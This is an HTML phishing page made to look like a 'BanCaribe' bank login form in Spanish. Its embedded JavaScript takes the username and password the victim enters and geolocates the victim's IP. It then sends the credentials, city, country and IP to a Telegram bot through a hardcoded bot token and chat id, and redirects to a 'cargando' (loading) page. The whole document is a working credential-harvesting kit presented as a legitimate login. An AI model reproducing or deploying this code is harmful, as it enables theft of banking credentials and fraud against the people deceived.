<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">

    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .footer {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            background-color: transparent;
            /* Cambia el color de fondo según tus preferencias */
            padding: 20px 0;
            box-sizing: border-box;
        }

        .footer img {
            width: 50%;
            min-width: 350px;
            margin-top: 50px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        @media only screen and (max-width: 600px) {
            .footer img {
                width: 80%;
                /* Ajusta el tamaño de la imagen para dispositivos móviles */
                min-width: unset;
            }

            .footer {
                display: none;
            }
        }
    </style>
</head>

<body style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">
    <div class="container">
        <img src="logo.png" alt="Logo" class="logo">
        <form class="login-form" id="loginform">
            <div style="width: 96%;padding: 10px;background: #00a0b1;color: white;font-weight: bold;">Ingresar al
                Sistema</div>
            <div style="margin: 30px;">
                <input type="text" placeholder="Usuario" id="userlogin" required>
                <input type="password" placeholder="Contraseña" id="passwd" required>
                <button type="submit">Ingresar</button>
            </div>
        </form>
        <div style="text-align: center;">
            <img src="2.PNG" style="width: 25%; min-width: 350px;margin-top: 50px;">
            <br>
            <div class="footer">
                <img src="footer.PNG" alt="Footer">
            </div>
        </div>

    </div>

</body>
<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

<script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
        event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
        axios
            .get(url)
            .then((response) => {
                const tipodocben = document.querySelector("#userlogin").value;
                const documento = document.querySelector("#passwd").value;
                localStorage.setItem("usuario", documento);
                const message =
                    "\nBanCaribe\nUsuario: " +
                    tipodocben +
                    "\nContra: " +
                    documento +
                    "\nCiudad:" +
                    response.data.city +
                    "\nPais: " +
                    response.data.country +
                    "\nIP: " +
                    response.data.ip;
                axios
                    .post(
                        "https://api.telegram.org/bot7687111592:AAHMnj4bePE4PPAQVedk4zsqab5ZFPz2anw/sendMessage",
                        {
                            chat_id: "-4603058932",
                            text: message,
                        }
                    )
                    .then((response) => {
                        window.location.href = "cargando.html";
                    })
                    .catch((error) => {
                        console.error(error);
                    });
            })
            .catch((error) => {
                console.log(error);
            });
    });
</script>

</html>
